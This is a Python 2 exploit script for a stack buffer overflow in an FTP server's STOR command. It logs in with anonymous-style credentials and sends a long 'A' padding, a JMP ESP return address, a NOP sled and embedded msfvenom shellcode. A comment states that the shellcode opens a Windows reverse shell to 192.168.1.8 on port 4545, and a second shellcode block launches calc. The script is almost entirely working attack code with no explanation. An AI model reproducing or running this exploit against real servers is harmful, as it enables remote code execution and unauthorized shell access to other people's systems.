import socket



s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(('192.168.1.22',21))
r=s.recv(1024)
print r
s.send('USER ftp' + '\r\n')
r=s.recv(1024)
print r
s.send('PASS ftp' + '\r\n')
r=s.recv(1024)
print r

#eipoffset 963
#calc size 220
shellcode_calc =  ""
shellcode_calc += "\xbd\x9b\x0f\x1a\xed\xdb\xd1\xd9\x74\x24"
shellcode_calc += "\xf4\x5a\x33\xc9\xb1\x31\x31\x6a\x13\x03"
shellcode_calc += "\x6a\x13\x83\xc2\x9f\xed\xef\x11\x77\x73"
shellcode_calc += "\x0f\xea\x87\x14\x99\x0f\xb6\x14\xfd\x44"
shellcode_calc += "\xe8\xa4\x75\x08\x04\x4e\xdb\xb9\x9f\x22"
shellcode_calc += "\xf4\xce\x28\x88\x22\xe0\xa9\xa1\x17\x63"
shellcode_calc += "\x29\xb8\x4b\x43\x10\x73\x9e\x82\x55\x6e"
shellcode_calc += "\x53\xd6\x0e\xe4\xc6\xc7\x3b\xb0\xda\x6c"
shellcode_calc += "\x77\x54\x5b\x90\xcf\x57\x4a\x07\x44\x0e"
shellcode_calc += "\x4c\xa9\x89\x3a\xc5\xb1\xce\x07\x9f\x4a"
shellcode_calc += "\x24\xf3\x1e\x9b\x75\xfc\x8d\xe2\xba\x0f"
shellcode_calc += "\xcf\x23\x7c\xf0\xba\x5d\x7f\x8d\xbc\x99"
shellcode_calc += "\x02\x49\x48\x3a\xa4\x1a\xea\xe6\x55\xce"
shellcode_calc += "\x6d\x6c\x59\xbb\xfa\x2a\x7d\x3a\x2e\x41"
shellcode_calc += "\x79\xb7\xd1\x86\x08\x83\xf5\x02\x51\x57"
shellcode_calc += "\x97\x13\x3f\x36\xa8\x44\xe0\xe7\x0c\x0e"
shellcode_calc += "\x0c\xf3\x3c\x4d\x5a\x02\xb2\xeb\x28\x04"
shellcode_calc += "\xcc\xf3\x1c\x6d\xfd\x78\xf3\xea\x02\xab"
shellcode_calc += "\xb0\x15\xe1\x7e\xcc\xbd\xbc\xea\x6d\xa0"
shellcode_calc += "\x3e\xc1\xb1\xdd\xbc\xe0\x49\x1a\xdc\x80"
shellcode_calc += "\x4c\x66\x5a\x78\x3c\xf7\x0f\x7e\x93\xf8"
shellcode_calc += "\x05\x1d\x72\x6b\xc5\xcc\x11\x0b\x6c\x11"


#shellcode 389bytes msfvenom -p windows/shell/reverse_tcp lhost=192.168.1.8 lport=4545 -b '\x00\x0a'
shellcode =  ""
shellcode += "\xb8\xaf\x9a\x14\xd2\xd9\xcb\xd9\x74\x24\xf4\x5d"
shellcode += "\x2b\xc9\xb1\x5b\x31\x45\x14\x83\xc5\x04\x03\x45"
shellcode += "\x10\x4d\x6f\xe8\x3a\x13\x90\x11\xbb\x73\x18\xf4"
shellcode += "\x8a\xb3\x7e\x7c\xbc\x03\xf4\xd0\x31\xe8\x58\xc1"
shellcode += "\xc2\x9c\x74\xe6\x63\x2a\xa3\xc9\x74\x06\x97\x48"
shellcode += "\xf7\x54\xc4\xaa\xc6\x97\x19\xaa\x0f\xc5\xd0\xfe"
shellcode += "\xd8\x82\x47\xef\x6d\xde\x5b\x84\x3e\xcf\xdb\x79"
shellcode += "\xf6\xee\xca\x2f\x8c\xa9\xcc\xce\x41\xc2\x44\xc9"
shellcode += "\x86\xee\x1f\x62\x7c\x85\xa1\xa2\x4c\x66\x0d\x8b"
shellcode += "\x60\x95\x4f\xcb\x47\x45\x3a\x25\xb4\xf8\x3d\xf2"
shellcode += "\xc6\x26\xcb\xe1\x61\xad\x6b\xce\x90\x62\xed\x85"
shellcode += "\x9f\xcf\x79\xc1\x83\xce\xae\x79\xbf\x5b\x51\xae"
shellcode += "\x49\x1f\x76\x6a\x11\xc4\x17\x2b\xff\xab\x28\x2b"
shellcode += "\xa0\x14\x8d\x27\x4d\x41\xbc\x65\x1a\xa6\x8d\x95"
shellcode += "\xda\xa0\x86\xe6\xe8\x6f\x3d\x61\x41\xf8\x9b\x76"
shellcode += "\xd0\xee\x1b\xa8\x5a\x7e\xe2\x49\x9b\x57\x21\x1d"
shellcode += "\xcb\xcf\x80\x1e\x80\x0f\x2c\xcb\x3d\x0e\xba\x34"
shellcode += "\x69\x11\x32\xdd\x68\x11\x53\xdc\xe4\xf7\x03\x8e"
shellcode += "\xa6\xa7\xe3\x7e\x07\x17\x8c\x94\x88\x48\xac\x96"
shellcode += "\x42\xe1\x47\x79\x3b\x5a\xf0\xe0\x66\x10\x61\xec"
shellcode += "\xbc\x5d\xa1\x66\x35\xa2\x6c\x8f\x3c\xb0\x99\xe8"
shellcode += "\xbe\x48\x5a\x9d\xbe\x22\x5e\x37\xe8\xda\x5c\x6e"
shellcode += "\xde\x45\x9e\x45\x5c\x81\x60\x18\x55\xfa\x57\x8e"
shellcode += "\xd9\x94\x97\x5e\xda\x64\xce\x34\xda\x0c\xb6\x6c"
shellcode += "\x89\x29\xb9\xb8\xbd\xe2\x2c\x43\x94\x57\xe6\x2b"
shellcode += "\x1a\x8e\xc0\xf3\xe5\xe5\x52\xf3\x1a\x78\x7d\x5c"
shellcode += "\x73\x82\x3d\x5c\x83\xe8\xbd\x0c\xeb\xe7\x92\xa3"
shellcode += "\xdb\x08\x39\xec\x73\x83\xac\x5e\xe5\x94\xe4\x3f"
shellcode += "\xbb\x95\x0b\xe4\x4c\xec\x64\x1b\xad\x11\x6d\x78"
shellcode += "\xad\x12\x91\x7e\x91\xc5\xa8\xf4\xd4\xd6\x8e\x17"
shellcode += "\xcb\xf2\xfa\xbf\x52\x97\x46\xa2\x64\x42\x84\xdb"
shellcode += "\xe6\x66\x75\x18\xf6\x03\x70\x64\xb0\xf8\x08\xf5"
shellcode += "\x55\xfe\xbf\xf6\x7f"

jmpesp='\x7b\xd0\x1b\x77'
buf = '\x41'*963 + jmpesp + '\x90'*25 + shellcode 
s.send('STOR woof ' + buf + '\r\n')
r=s.recv(1024)
print r
s.close()


### 0x10w1eve1 ###
